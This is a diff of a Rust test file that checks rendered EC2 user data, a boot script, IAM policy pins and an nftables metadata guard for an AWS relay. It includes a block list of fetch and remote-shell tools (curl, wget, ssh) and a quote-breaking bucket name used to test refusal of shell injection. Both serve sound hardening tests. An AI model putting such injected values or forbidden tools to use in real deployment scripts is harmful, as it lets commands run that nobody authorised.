@@ -4,7 +4,9 @@
 //! run with node; the plan check runs as `make deploy` runs it, through infra/scripts/check-plan.sh (its own compile,
 //! into a `PLAN_CHECK_OUT` of the test's). The reload unit, infra/relay/reload.py, runs under the Mac's
 //! `/usr/bin/python3 -I` (Q-I4) in a planted §I-infra.3.3 tree (`AI_ENV_RELAY_ROOT`, [`World`]): its aws is
-//! tests/fakes/aws.sh (a Parameter Store and a bucket in files), its systemctl the logging fake [`SYSTEMCTL`]. The list
+//! tests/fakes/aws.sh (a Parameter Store and a bucket in files), its systemctl, nft and swapon the logging fakes
+//! [`SYSTEMCTL`], [`NFT`] and [`SWAPON`]. The rendered user data runs under `/bin/bash` with every system path rewritten
+//! into a temporary directory and fakes for what touches the system ([`Bootstrap`]); boot.sh never runs here. The list
 //! documents are I-R77's placeholders; every TLS pair is built at run time from parts around a low-entropy body
 //! (I-R78). Nothing reaches AWS or the network, and every child runs under common's deadline.
 use super::common::*;
@@ -260,12 +262,14 @@ console.log(JSON.stringify({
 }
 
 /// I-T3: the endpoint's, the relay role's and its trust policy's documents for the example account are the pinned ones
-/// (I-R40, I-R42, I-R43), their sizes I-R45's, in Rust (`canonical_policy_sha256`) and in TypeScript alike.
+/// (I-R40, I-R42, I-R43), their sizes I-R45's, in Rust (`canonical_policy_sha256`) and in TypeScript alike. The relay
+/// role's moved with R-93 (it reads `peers` by name: S13's was `b48ef84b…9cfd`, 1523 characters), as print-policies
+/// measures it.
 #[test]
 fn the_relay_documents_of_policies_ts_are_the_pinned_ones() {
     for (name, pinned, size) in [
         ("s3-endpoint", "1e30d2178ae4648b2aca53e97c05e22c42d207c2295e1478ded56de73034cc47", 842),
-        ("relay", "b48ef84bf578a98b04b86fb2580401f0987b5b5702ecf51be69c545c9a7d9cfd", 1523),
+        ("relay", "ef34503c836d0dc945c20e177fbaf65cca49665246683c8211c3fb9ed0b0665f", 1592),
         ("relay-trust", "131984e3027c5a54ad8ffbf5d543bf4c11a2eebdb7113e021f229772960667b9", 146),
     ] {
         let printed = pp(&["--name", name]);
@@ -299,9 +303,9 @@ fn every_document_fits_its_quota_offline() {
     assert!(listed.contains("\nrelay-trust\tRESOURCE_POLICY\t") && listed.contains("\nrelay\tIDENTITY_POLICY\t"), "{listed}");
 }
 
-/// I-T5: ai-env-ops starts and stops the relay instance and reads its four non-secret parameters, and nothing more of
-/// it: never the TLS pair, never a relay parameter by a wildcard, never a command or a session on the relay instance;
-/// it reads the relay's log group and lists the account's addresses.
+/// I-T5: ai-env-ops starts and stops the relay instance and reads its five non-secret parameters (`peers` since R-93,
+/// for `ai-env relay status`), and nothing more of it: never the TLS pair, never a relay parameter by a wildcard, never
+/// a command or a session on the relay instance; it reads the relay's log group and lists the account's addresses.
 #[test]
 fn ops_starts_the_relay_and_reads_its_parameters_but_the_tls_pair() {
     let ops = document("ops");
@@ -311,7 +315,7 @@ fn ops_starts_the_relay_and_reads_its_parameters_but_the_tls_pair() {
     assert_eq!(list(&relay["Resource"]), [format!("arn:aws:ec2:eu-central-1:{ACCOUNT}:instance/i-0123456789abcdef1")]);
     let read = statement(&ops, "ReadRelayParameters");
     assert_eq!(list(&read["Action"]), ["ssm:GetParameters"]);
-    assert_eq!(list(&read["Resource"]), ["artifact", "workers", "grants", "token-signers"].map(parameter));
+    assert_eq!(list(&read["Resource"]), ["artifact", "workers", "grants", "token-signers", "peers"].map(parameter));
     for s in ops["Statement"].as_array().unwrap() {
         let sid = s["Sid"].as_str().unwrap_or("(no Sid)");
         let actions = list(&s["Action"]);
@@ -376,9 +380,10 @@ console.log(JSON.stringify({ none: inv(cfg), firewall: inv({ ...cfg, dnsMode: 'f
     )
 }
 
-/// I-R9's nineteen: what S13 adds to the stack in every mode.
-const RELAY_INVENTORY: [(&str, &str); 19] = [
+/// I-R9's nineteen and the boot object (LD-R56): what S13 adds to the stack in every mode.
+const RELAY_INVENTORY: [(&str, &str); 20] = [
     ("aws:s3/bucketObjectv2:BucketObjectv2", "relay-artifact"),
+    ("aws:s3/bucketObjectv2:BucketObjectv2", "relay-boot"),
     ("aws:cloudwatch/logGroup:LogGroup", "relay-log-group"),
     ("aws:iam/role:Role", "ai-env-relay"),
     ("aws:iam/rolePolicy:RolePolicy", "ai-env-relay"),
@@ -399,12 +404,13 @@ const RELAY_INVENTORY: [(&str, &str); 19] = [
     ("aws:ssm/parameter:Parameter", "ai-env-relay-artifact"),
 ];
 
-/// I-T7: the inventory holds I-R9's nineteen in every mode, and with the stack counts 94, 99 and 102 (S12: 75, 80, 83).
+/// I-T7: the inventory holds the relay's twenty (I-R9's nineteen, LD-R56's boot object) in every mode, and with the stack
+/// counts 95, 100 and 103 (S12: 75, 80, 83).
 #[test]
-fn the_inventory_counts_the_relay_19_more() {
+fn the_inventory_counts_the_relay_20_more() {
     let inv = inventories();
     let total = |mode: &str| 1 + inv[mode].as_object().unwrap().values().map(|names| names.as_array().unwrap().len()).sum::<usize>();
-    assert_eq!((total("none"), total("firewall"), total("queryLog")), (94, 99, 102));
+    assert_eq!((total("none"), total("firewall"), total("queryLog")), (95, 100, 103));
     for mode in ["none", "firewall", "queryLog"] {
         for (ty, name) in RELAY_INVENTORY {
             assert!(inv[mode][ty].as_array().is_some_and(|names| names.iter().any(|n| n == name)), "{mode}: {ty} {name} missing");
@@ -413,10 +419,10 @@ fn the_inventory_counts_the_relay_19_more() {
 }
 
 /// The lines between `base64 -d <<'AIENV_RELAY_RELOAD_EOF' …` and its delimiter (reload.py.gz in base64, in which any
-/// word may occur), and the rest of the user data.
-fn split_reload_block(user_data: &str) -> (Vec<String>, String) {
+/// word may occur), and the rest of the boot script.
+fn split_reload_block(boot: &str) -> (Vec<String>, String) {
     let (mut block, mut rest, mut inside) = (vec![], String::new(), false);
-    for line in user_data.lines() {
+    for line in boot.lines() {
         if inside && line != "AIENV_RELAY_RELOAD_EOF" {
             block.push(line.to_string());
             continue;
@@ -466,33 +472,87 @@ fn append(file: &Path, more: &str) {
     std::fs::write(file, format!("{}{more}", text(file))).unwrap();
 }
 
-/// I-T8: the relay's user data, rendered from the tree (R's files through relayDeployDir()), fits EC2's limit, leaves
-/// no placeholder, parses, and carries reload.py (gzipped, base64), the CloudWatch file and R's three files byte for
-/// byte, every line slice I rests on, relay.env's lines (R's example less AI_ENV_RELAY_ID), the timers, the relay's
-/// user, the swapfile, the packages and the units enabled, and no update, fetch tool or port 22. Copies are refused
-/// with I-R25's texts: over the limit, a stale .gz, a placeholder in reload.py, a required line of R's missing (the
-/// guard's IPv4, SYN or non-TCP rule among them), a rule ahead of the guard's holding a verdict or conntrack (each of
-/// accept, return, jump, goto, queue, ct and notrack), a heredoc delimiter in R's unit, R's guard.nft missing; the
-/// same words in a comment are no statement (the control).
+/// `/bin/bash -n` of `script`, written under `dir` as `name`.
+fn parses(dir: &Path, name: &str, script: &str) {
+    std::fs::write(dir.join(name), script).unwrap();
+    let mut cmd = Command::new("/bin/bash");
+    cmd.arg("-n").arg(dir.join(name)).stdin(Stdio::null());
+    let o = bounded(&mut cmd, "bash -n");
+    assert!(o.status.success(), "bash -n {name}: {}", all(&o));
+}
+
+/// The boot object's files, the user data rendered for them in [`BUCKET`], and R's required lines, from the tree (R's
+/// files through relayDeployDir()).
+fn rendered_relay() -> Value {
+    node(
+        "const dir = path.join(infra, 'relay');\n\
+         const files = rs.renderRelayFiles(cfg, 'eu-central-1', dir);\n\
+         console.log(JSON.stringify({ files, userData: rs.renderRelayUserData(process.env.RT_BUCKET, files, 'eu-central-1', dir), required: rs.RELAY_REQUIRED_LINES }));",
+        &[("AI_ENV_REPO_ROOT", REPO), ("RT_BUCKET", BUCKET)],
+    )
+}
+
+/// I-T8 (split by LD-R56). The relay's user data, rendered from the tree, fits EC2's limit, leaves no placeholder, parses,
+/// and is the bootstrap alone: the swapfile first, kept in /etc/fstab (LD-R57), then the one fetch of the boot object in
+/// reload.py's form, its SHA-256 against the pin, and /bin/bash on the file. The boot script, rendered from the tree (R's
+/// files through relayDeployDir()), leaves no placeholder, parses, and carries reload.py (gzipped, base64), the
+/// CloudWatch file and R's three files byte for byte, every line slice I rests on, relay.env's lines (R's example less
+/// AI_ENV_RELAY_ID), the timers, the relay's user, the packages and the units enabled. Neither holds an update, a fetch
+/// tool or port 22. The relay security plan's change (R-95, R-96, LD-R57): the unit's `InaccessiblePaths=/run/dbus`,
+/// `InaccessiblePaths=-/run/systemd/resolve` and `MemorySwapMax=256M`, logrotate every 5 minutes (its drop-in's
+/// `AccuracySec=1min` and `RandomizedDelaySec=0` over the package's timer) with `size 20M` and `nodateext` in both
+/// stanzas (no interval, no `maxsize`, no `dateext`: AL2023's logrotate.conf sets it, and a dated name rotates a log once
+/// a day at most), the CloudWatch agent as `cwagent` and `cwagent` in the relay's group after the packages and before the
+/// agent starts, never fatal, relay.log made 0644 root when missing before the units start, and no comment line in
+/// either script. Copies are refused with I-R25's texts, each on the file that holds it: over the limit (user-data.sh's),
+/// a stale .gz, a placeholder in reload.py, boot.sh or user-data.sh, a token gone from either, boot.sh missing, a required
+/// line of R's missing (the guard's IPv4, SYN or non-TCP rule, the unit's D-Bus and resolved blocks and its swap allowance
+/// among them), a rule ahead of the guard's holding a verdict or conntrack (each of accept, return, jump, goto, queue, ct
+/// and notrack), a heredoc delimiter in R's unit, R's guard.nft missing; the same words in a comment are no statement,
+/// and a reload.py past EC2's limit no longer refused (the controls). The bucket, key and hash the user data takes are
+/// refused unless of their shapes: they go into a shell script.
 #[test]
 fn the_relay_files_render_small_whole_and_hardened() {
     let deploy = Path::new(REPO).join("crates/ai-env-relay/deploy");
     let relay_dir = infra().join("relay");
-    let r = node(
-        "console.log(JSON.stringify({ files: rs.renderRelayFiles(cfg, 'eu-central-1', path.join(infra, 'relay')), required: rs.RELAY_REQUIRED_LINES }));",
-        &[("AI_ENV_REPO_ROOT", REPO)],
-    );
-    let ud = r["files"]["userData"].as_str().unwrap();
+    let r = rendered_relay();
+    let (ud, boot) = (r["userData"].as_str().unwrap(), r["files"]["boot"].as_str().unwrap());
+    let (key, sha) = (r["files"]["bootKey"].as_str().unwrap(), r["files"]["bootSha256"].as_str().unwrap());
+    let t = tempfile::tempdir().unwrap();
+
+    // The user data's own checks.
     assert!(ud.len() <= 16_384, "{} bytes", ud.len());
     assert_eq!(placeholder_in(ud), None);
-    let t = tempfile::tempdir().unwrap();
-    std::fs::write(t.path().join("user-data.sh"), ud).unwrap();
-    let mut cmd = Command::new("/bin/bash");
-    cmd.arg("-n").arg(t.path().join("user-data.sh")).stdin(Stdio::null());
-    let o = bounded(&mut cmd, "bash -n");
-    assert!(o.status.success(), "bash -n: {}", all(&o));
+    parses(t.path(), "user-data.sh", ud);
+    let ud_lines: Vec<&str> = ud.lines().collect();
+    let ud_at = |want: &str| ud_lines.iter().position(|l| *l == want).unwrap_or_else(|| panic!("no line {want}:\n{ud}"));
+    let fetch = format!("until timeout 60 aws s3api get-object --bucket '{BUCKET}' --key '{key}' --region 'eu-central-1' --endpoint-url 'https://s3.eu-central-1.amazonaws.com' \"$boot\" > /dev/null; do");
+    let swap = [
+        "if [ ! -f /swapfile ]; then",
+        "  dd if=/dev/zero of=/swapfile.new bs=1M count=512 status=none",
+        "  chmod 0600 /swapfile.new",
+        "  mkswap /swapfile.new > /dev/null",
+        "  mv /swapfile.new /swapfile",
+        "fi",
+        "swapon --show=NAME --noheadings | grep -qx /swapfile || swapon /swapfile",
+        "grep -q '^/swapfile ' /etc/fstab || echo '/swapfile none swap defaults 0 0' >> /etc/fstab",
+    ];
+    assert_eq!(ud_lines[3..3 + swap.len()], swap, "LD-R57: the swap first, and for good: on, and in /etc/fstab");
+    assert!(ud_at(swap[7]) < ud_at(&fetch), "the swap steps come before the fetch (the aws CLI is OOM-killed at t4g.nano memory)");
+    assert_eq!(ud.matches("aws s3api get-object").count(), 1, "the bootstrap's one fetch");
+    assert_eq!(ud.matches(sha).count(), 2, "the pin, and the refusal naming it: {ud}");
+    let pin = ud_at(&format!("if [ \"$got\" != '{sha}' ]; then"));
+    assert!(ud_at(&fetch) < ud_at("got=$(sha256sum \"$boot\" | cut -d' ' -f1)") && ud_at("got=$(sha256sum \"$boot\" | cut -d' ' -f1)") < pin, "fetched, then hashed, then compared");
+    assert_eq!(ud_lines.last(), Some(&"exec /bin/bash \"$boot\""), "/bin/bash on the file, the last step");
+    for gone in ["useradd", "dnf", "systemctl", "swapoff", "umask"] {
+        assert!(!ud.contains(gone), "{gone} in the user data: boot.sh's, and no umask of its own to pass on to it");
+    }
 
-    let (block, rest) = split_reload_block(ud);
+    // The boot script's.
+    assert_eq!(placeholder_in(boot), None);
+    parses(t.path(), "boot.sh", boot);
+    assert!(boot.starts_with("#!/bin/bash\nset -euo pipefail\n"), "I-R26");
+    let (block, rest) = split_reload_block(boot);
     assert!(!block.is_empty() && block.iter().all(|l| l.len() <= 76), "base64 in lines of 76: {block:?}");
     use base64::Engine as _;
     let gz = base64::engine::general_purpose::STANDARD.decode(block.concat()).unwrap();
@@ -505,11 +565,11 @@ fn the_relay_files_render_small_whole_and_hardened() {
         ("AIENV_RELAY_UNIT_EOF", text(&deploy.join("guard.nft"))),
         ("AIENV_RELAY_CW_EOF", cw),
     ] {
-        assert!(file.ends_with('\n') && ud.contains(&format!("<<'{delimiter}'\n{file}{delimiter}\n")), "not embedded byte for byte:\n{file}");
+        assert!(file.ends_with('\n') && boot.contains(&format!("<<'{delimiter}'\n{file}{delimiter}\n")), "not embedded byte for byte:\n{file}");
     }
     for (file, lines) in r["required"].as_object().unwrap() {
         for want in lines.as_array().unwrap() {
-            assert!(ud.lines().any(|l| l.trim() == want), "{file}'s line {want} is not a line of the user data");
+            assert!(boot.lines().any(|l| l.trim() == want), "{file}'s line {want} is not a line of the boot script");
         }
     }
     let example = text(&deploy.join("relay.env.example"));
@@ -541,13 +601,63 @@ fn the_relay_files_render_small_whole_and_hardened() {
         "systemctl enable ai-env-relay-guard.service ai-env-relay.service",
         "systemctl enable --now ai-env-relay-reload.timer ai-env-relay-patch.timer logrotate.timer",
     ] {
-        assert!(ud.lines().any(|l| l == line), "no line {line}");
+        assert!(boot.lines().any(|l| l == line), "no line {line}");
     }
-    for want in ["useradd --system", "dd if=/dev/zero of=/swapfile.new bs=1M count=512", "swapon /swapfile", "dnf -y install amazon-cloudwatch-agent logrotate nftables dnf-plugins-core"] {
-        assert!(ud.contains(want), "{want}");
+    for want in ["useradd --system", "dnf -y install amazon-cloudwatch-agent logrotate nftables dnf-plugins-core"] {
+        assert!(boot.contains(want), "{want}");
     }
+    assert!(!rest.contains("/swapfile") && !rest.contains("swapoff"), "the swap is the user data's, and nothing removes it");
+    assert!(!rest.contains("aws s3"), "aws s3api get-object is the bootstrap's one fetch (the binary's is reload.py's)");
+
+    // Both: the hex of the pin and the key is not text of the script ("22" may well be in it).
+    let bootstrap = ud.replace(sha, "SHA256").replace(key, "KEY");
     for never in ["dnf update", "curl", "wget", "ssh", "22"] {
-        assert!(!rest.contains(never), "{never} in the user data (outside reload.py's base64)");
+        assert!(!bootstrap.contains(never), "{never} in the user data");
+        assert!(!rest.contains(never), "{never} in the boot script (outside reload.py's base64)");
+    }
+
+    // R-95 and R-96, the relay security plan's one user-data change; LD-R57.
+    let required = r["required"]["ai-env-relay.service"].as_array().unwrap();
+    for block in ["InaccessiblePaths=/run/dbus", "InaccessiblePaths=-/run/systemd/resolve", "MemorySwapMax=256M"] {
+        assert!(required.iter().any(|l| l == block), "lines slice I rests on (F29's socket blocks, LD-R57's swap): {block} is not in {required:?}");
+    }
+    let lines: Vec<&str> = boot.lines().collect();
+    let at = |want: &str| lines.iter().position(|l| *l == want).unwrap_or_else(|| panic!("no line {want}"));
+    let drop_in = at("cat > /etc/systemd/system/logrotate.timer.d/ai-env.conf <<'AIENV_RELAY_UNIT_EOF'");
+    assert_eq!(
+        lines[drop_in + 1..drop_in + 7],
+        ["[Timer]", "OnCalendar=", "OnCalendar=*:0/5", "AccuracySec=1min", "RandomizedDelaySec=0", "AIENV_RELAY_UNIT_EOF"],
+        "logrotate every 5 minutes (F23), whatever accuracy or delay the package's timer carries"
+    );
+    for head in ["/var/log/ai-env-relay/*.log {", "/var/log/ai-env-relay/requests/*.log {"] {
+        let stanza = at(head);
+        let directives: Vec<&str> = lines[stanza + 1..].iter().map(|l| l.trim()).take_while(|l| *l != "}").collect();
+        for want in ["size 20M", "nodateext"] {
+            assert!(directives.contains(&want), "{head} {want}: a log past 20 MB rotates at any run, however many a day: {directives:?}");
+        }
+        for never in ["hourly", "daily", "weekly", "monthly", "yearly", "maxsize", "dateext", "dateformat"] {
+            assert!(!directives.iter().any(|d| d.starts_with(never)), "{head} {never}: size alone, with no interval and no date in the name, rotates at every run past 20M: {directives:?}");
+        }
+    }
+    assert!(!boot.contains("OnCalendar=hourly") && !boot.contains("maxsize"), "no hourly timer, no maxsize anywhere");
+    let cw: Value = serde_json::from_str(r["files"]["cwAgent"].as_str().unwrap()).unwrap();
+    assert_eq!(cw["agent"]["run_as_user"], "cwagent", "the CloudWatch agent never runs as root (F21)");
+    let ctl = lines.iter().position(|l| l.starts_with("/opt/aws/amazon-cloudwatch-agent/bin/amazon-cloudwatch-agent-ctl ")).expect("the agent's start");
+    let usermod = at("usermod -aG ai-env-relay cwagent || logger -s -t ai-env-relay-user-data 'cwagent could not join ai-env-relay: requests.log is not shipped' || true");
+    assert!(
+        at("rpm -q amazon-cloudwatch-agent logrotate nftables dnf-plugins-core > /dev/null") < usermod && usermod < ctl,
+        "cwagent joins the relay's group after the packages, before the agent starts, never fatal (I-R26 step 10)"
+    );
+    let relay_log = at("[ -e /var/log/ai-env-relay/relay.log ] || install -m 0644 -o root -g root /dev/null /var/log/ai-env-relay/relay.log");
+    let dirs = at("install -d -m 0755 -o root -g root /etc/ai-env-relay /usr/local/libexec/ai-env-relay /var/log/ai-env-relay /etc/systemd/system/logrotate.timer.d");
+    assert!(
+        dirs < relay_log && relay_log < at("systemctl enable ai-env-relay-guard.service ai-env-relay.service"),
+        "relay.log 0644 root before the units start, made only when missing (install unlinks the file it replaces: safe to run twice)"
+    );
+    for (file, want) in [("user-data.sh", vec!["#!/bin/bash"]), ("boot.sh", vec!["#!/bin/bash", "#!/bin/bash"])] {
+        let template = text(&relay_dir.join(file));
+        let comments: Vec<&str> = template.lines().filter(|l| l.trim_start().starts_with('#')).collect();
+        assert_eq!(comments, want, "{file} carries no comment: their steps are relay-spec.ts's: its shebang, and in boot.sh the patch script's");
     }
 
     // The refusals, each on a copy of infra/relay and R's deploy/ with one change.
@@ -558,8 +668,13 @@ fn the_relay_files_render_small_whole_and_hardened() {
         (dir, deploy_dir)
     };
     let mut cases: Vec<(&str, PathBuf, PathBuf, String)> = vec![];
-    // reload.py padded past the limit with 24 KiB of a SHA-256 chain's hex, its .gz regenerated (incompressible enough).
+    // The user data past the limit: 17 KiB of comment.
     let (dir, d) = case("padded");
+    append(&dir.join("user-data.sh"), &format!("# {}\n", "pad ".repeat(17 * 256)));
+    cases.push(("padded", dir.clone(), d, format!("{}/user-data.sh: rendered ", dir.display())));
+    // reload.py padded past the limit with 24 KiB of a SHA-256 chain's hex, its .gz regenerated (incompressible enough):
+    // the boot object's size has no limit (LD-R56).
+    let (dir, d) = case("padded-reload");
     let mut h = Sha256::digest(b"ai-env relay padding").to_vec();
     let mut pad = String::new();
     while pad.len() < 24 * 1024 {
@@ -572,13 +687,26 @@ fn the_relay_files_render_small_whole_and_hardened() {
     let o = bounded(&mut cmd, "gzip");
     assert!(o.status.success(), "gzip: {}", stderr(&o));
     std::fs::write(dir.join("reload.py.gz"), &o.stdout).unwrap();
-    cases.push(("padded", dir.clone(), d, format!("{}/user-data.sh: rendered ", dir.display())));
+    cases.push(("padded-reload", dir, d, String::new()));
     let (dir, d) = case("stale-gz");
     append(&dir.join("reload.py"), "# changed\n");
     cases.push(("stale-gz", dir.clone(), d, format!("{}/reload.py.gz is not reload.py compressed: run make relay-reload-gz", dir.display())));
     let (dir, d) = case("placeholder");
     append(&dir.join("reload.py"), "# @X@\n");
     cases.push(("placeholder", dir.clone(), d, format!("{}/reload.py: holds the placeholder @X@, which nothing fills", dir.display())));
+    for (name, file) in [("placeholder-in-boot", "boot.sh"), ("placeholder-in-user-data", "user-data.sh")] {
+        let (dir, d) = case(name);
+        append(&dir.join(file), "true @X@\n");
+        cases.push((name, dir.clone(), d, format!("{}/{file}: unknown placeholder(s) @X@ left after rendering (none is filled later)", dir.display())));
+    }
+    for (name, file, token) in [("no-reload-token", "boot.sh", "RELOAD_PY_GZ"), ("no-unit-token", "boot.sh", "RELAY_UNIT"), ("no-pin-token", "user-data.sh", "BOOT_HASH"), ("no-key-token", "user-data.sh", "BOOT_KEY")] {
+        let (dir, d) = case(name);
+        std::fs::write(dir.join(file), text(&dir.join(file)).replace(&format!("@{token}@"), "x")).unwrap();
+        cases.push((name, dir.clone(), d, format!("{}/{file}: the placeholder(s) @{token}@ are missing (contract 3)", dir.display())));
+    }
+    let (dir, d) = case("no-boot-sh");
+    std::fs::remove_file(dir.join("boot.sh")).unwrap();
+    cases.push(("no-boot-sh", dir.clone(), d, format!("{}/boot.sh not found (the relay's boot files, infra/relay)", dir.display())));
     let missing = |d: &Path, file: &str, line: &str| format!("{}/{file}: the line \"{line}\" is missing: slice I's layout or the plan's IMDS block rests on it (plans/s13-contracts.md §I-infra.4.5)", d.display());
     let (dir, d) = case("no-ip-address-deny");
     drop_lines(&d.join("ai-env-relay.service"), "IPAddressDeny=");
@@ -586,6 +714,16 @@ fn the_relay_files_render_small_whole_and_hardened() {
     let (dir, d) = case("no-user");
     drop_lines(&d.join("ai-env-relay.service"), "User=ai-env-relay");
     cases.push(("no-user", dir, d.clone(), missing(&d, "ai-env-relay.service", "User=ai-env-relay")));
+    let (dir, d) = case("no-dbus-block");
+    drop_lines(&d.join("ai-env-relay.service"), "InaccessiblePaths=/run/dbus");
+    cases.push(("no-dbus-block", dir, d.clone(), missing(&d, "ai-env-relay.service", "InaccessiblePaths=/run/dbus")));
+    let (dir, d) = case("no-resolve-block");
+    drop_lines(&d.join("ai-env-relay.service"), "/run/systemd/resolve");
+    cases.push(("no-resolve-block", dir, d.clone(), missing(&d, "ai-env-relay.service", "InaccessiblePaths=-/run/systemd/resolve")));
+    // LD-R57: the swap is a stated requirement.
+    let (dir, d) = case("no-swap-allowance");
+    drop_lines(&d.join("ai-env-relay.service"), "MemorySwapMax=");
+    cases.push(("no-swap-allowance", dir, d.clone(), missing(&d, "ai-env-relay.service", "MemorySwapMax=256M")));
     let (dir, d) = case("no-ipv4-guard");
     drop_lines(&d.join("guard.nft"), "ip daddr 169.254.0.0/16");
     cases.push(("no-ipv4-guard", dir, d.clone(), missing(&d, "guard.nft", "meta skuid \"ai-env-relay\" ip daddr 169.254.0.0/16 counter reject")));
@@ -614,7 +752,7 @@ fn the_relay_files_render_small_whole_and_hardened() {
         std::fs::write(d.join("guard.nft"), nft.replacen(hook, &format!("{hook}        {rule}\n"), 1)).unwrap();
         cases.push((name, dir, d.clone(), weakened(&d, rule, word)));
     }
-    // The control: the same words in a comment (in place of R's first, so the user data does not grow) are accepted.
+    // The control: the same words in a comment are accepted.
     let (dir, d) = case("words-in-a-comment");
     let nft = text(&d.join("guard.nft"));
     let first = nft.lines().find(|l| l.starts_with("# ")).expect("a comment line in R's guard.nft").to_string();
@@ -622,7 +760,7 @@ fn the_relay_files_render_small_whole_and_hardened() {
     cases.push(("words-in-a-comment", dir, d, String::new()));
     let (dir, d) = case("delimiter");
     append(&d.join("ai-env-relay.service"), "# AIENV_RELAY_UNIT_EOF\n");
-    cases.push(("delimiter", dir, d.clone(), format!("{}/ai-env-relay.service contains AIENV_RELAY_UNIT_EOF, a heredoc delimiter of user-data.sh: the embedded copy would end early", d.display())));
+    cases.push(("delimiter", dir, d.clone(), format!("{}/ai-env-relay.service contains AIENV_RELAY_UNIT_EOF, a heredoc delimiter of boot.sh: the embedded copy would end early", d.display())));
     let (dir, d) = case("no-guard-nft");
     std::fs::remove_file(d.join("guard.nft")).unwrap();
     cases.push(("no-guard-nft", dir, d.clone(), format!("{}/guard.nft not found (the relay's unit and IMDS guard, crates/ai-env-relay/deploy)", d.display())));
@@ -630,10 +768,10 @@ fn the_relay_files_render_small_whole_and_hardened() {
     let got = node(
         r#"const refusals = {};
 for (const [name, dir, deploy] of JSON.parse(process.env.RT_CASES)) {
-  try { rs.renderRelayFiles(cfg, 'eu-central-1', dir, deploy); refusals[name] = ''; } catch (e) { refusals[name] = e.message; }
+  try { rs.renderRelayUserData(process.env.RT_BUCKET, rs.renderRelayFiles(cfg, 'eu-central-1', dir, deploy), 'eu-central-1', dir); refusals[name] = ''; } catch (e) { refusals[name] = e.message; }
 }
 console.log(JSON.stringify(refusals));"#,
-        &[("RT_CASES", &list)],
+        &[("RT_CASES", &list), ("RT_BUCKET", BUCKET)],
     );
     for (name, _, _, want) in &cases {
         let message = got[name].as_str().unwrap();
@@ -642,6 +780,31 @@ console.log(JSON.stringify(refusals));"#,
         } else {
             assert_eq!(message, want, "{name}");
         }
+    }
+
+    // What goes into the shell script is of its shape.
+    let shapes = node(
+        r#"const dir = path.join(infra, 'relay'), good = rs.relayBootPin('a boot script');
+const refused = (bucket, pin) => { try { return rs.renderRelayUserData(bucket, pin, 'eu-central-1', dir) && ''; } catch (e) { return e.message; } };
+console.log(JSON.stringify({
+  good: refused(process.env.RT_BUCKET, good),
+  quote: refused("ai-env-artifacts-0'; true #", good),
+  other: refused('other-bucket', good),
+  key: refused(process.env.RT_BUCKET, { ...good, bootKey: rs.relayBootPin('another text').bootKey }),
+  binary: refused(process.env.RT_BUCKET, { ...good, bootKey: 'relay/ai-env-relay-' + good.bootSha256.slice(0, 16) }),
+  sha: refused(process.env.RT_BUCKET, { ...good, bootSha256: good.bootSha256.toUpperCase() }),
+}));"#,
+        &[("RT_BUCKET", BUCKET)],
+    );
+    assert_eq!(shapes["good"], "");
+    for (k, want) in [
+        ("quote", "relay user data: bucket \"ai-env-artifacts-0'; true #\" is not ai-env-artifacts-<suffix>"),
+        ("other", "relay user data: bucket \"other-bucket\" is not ai-env-artifacts-<suffix>"),
+        ("key", "relay user data: the boot object's key "),
+        ("binary", "relay user data: the boot object's key "),
+        ("sha", "relay user data: the boot object's sha256 "),
+    ] {
+        assert!(shapes[k].as_str().unwrap().starts_with(want), "{k}: {}", shapes[k]);
     }
 }
 
@@ -652,21 +815,22 @@ fn reload_py_list(name: &str) -> Vec<String> {
     serde_json::from_str(line.split_once(" = ").unwrap().1).unwrap()
 }
 
-/// I-T9: policies.ts's, reload.py's and Rust's parameter lists are the same five in one order, `tls` alone the secret
-/// in each (the one that is neither the artifact nor a list document), and Rust's names of the three lists are the
-/// worker SDK's (B-16).
+/// I-T9: policies.ts's, reload.py's and Rust's parameter lists are the same six in one order (`peers`, R-93, right
+/// before `tls`), `tls` alone the secret in each (the one that is neither the artifact nor a list document), and Rust's
+/// names of the four lists are the worker SDK's (B-16, R-85).
 #[test]
 fn the_relay_parameter_lists_agree() {
     use ai_env_cli::bridge::egress::{relay_param_name, RELAY_PARAMETERS};
     let ts = node("console.log(JSON.stringify({ params: pol.RELAY_PARAMETERS, tls: pol.RELAY_TLS }));", &[]);
     let rust: Vec<String> = RELAY_PARAMETERS.iter().map(|p| p.to_string()).collect();
     let (py, lists) = (reload_py_list("PARAMETERS"), reload_py_list("LISTS"));
+    assert_eq!(rust, ["artifact", "workers", "grants", "token-signers", "peers", "tls"], "bridge::egress::RELAY_PARAMETERS");
     assert_eq!(ts["params"], json!(rust), "policies.ts RELAY_PARAMETERS");
     assert_eq!(py, rust, "reload.py PARAMETERS");
     assert_eq!(ts["tls"], "tls", "policies.ts RELAY_TLS");
-    let worker = [ai_env_worker::policy::WORKERS, ai_env_worker::policy::GRANTS, ai_env_worker::policy::TOKEN_SIGNERS];
-    assert_eq!(["workers", "grants", "token-signers"].map(relay_param_name), worker.map(String::from));
-    assert_eq!(lists, ["workers", "grants", "token-signers"], "reload.py LISTS");
+    let worker = [ai_env_worker::policy::WORKERS, ai_env_worker::policy::GRANTS, ai_env_worker::policy::TOKEN_SIGNERS, ai_env_worker::policy::PEERS];
+    assert_eq!(["workers", "grants", "token-signers", "peers"].map(relay_param_name), worker.map(String::from));
+    assert_eq!(lists, ["workers", "grants", "token-signers", "peers"], "reload.py LISTS");
     let secret_py: Vec<&String> = py.iter().filter(|p| *p != "artifact" && !lists.contains(p)).collect();
     assert_eq!(secret_py, ["tls"]);
     let secret_rust: Vec<&&str> = RELAY_PARAMETERS.iter().filter(|p| **p != "artifact" && !worker.contains(&relay_param_name(p).as_str())).collect();
@@ -757,15 +921,39 @@ fn set_state(steps: &mut [Value], ty: &str, name: &str, inputs: Value, deps: Val
 /// runs it, its compile under a PLAN_CHECK_OUT of its own.
 fn check_plan(steps: &[Value]) -> Output {
     let t = tempfile::tempdir().unwrap();
+    check_plan_compiling(steps, &t.path().join("out"))
+}
+
+/// [`check_plan`] with its compile in `out`, for [`check_plan_again`].
+fn check_plan_compiling(steps: &[Value], out: &Path) -> Output {
+    let t = tempfile::tempdir().unwrap();
     let file = t.path().join("plan.json");
     std::fs::write(&file, json!({"steps": steps, "diagnostics": []}).to_string()).unwrap();
     let mut cmd = Command::new("/bin/bash");
     isolate(&mut cmd, t.path());
     cmd.arg(infra().join("scripts/check-plan.sh"))
         .args(["--mode", "none", "--account-id", ACCOUNT])
-        .env("PLAN_CHECK_OUT", t.path().join("out"))
+        .env("PLAN_CHECK_OUT", out)
         .stdin(std::fs::File::open(&file).unwrap());
     bounded(&mut cmd, "check-plan.sh")
+}
+
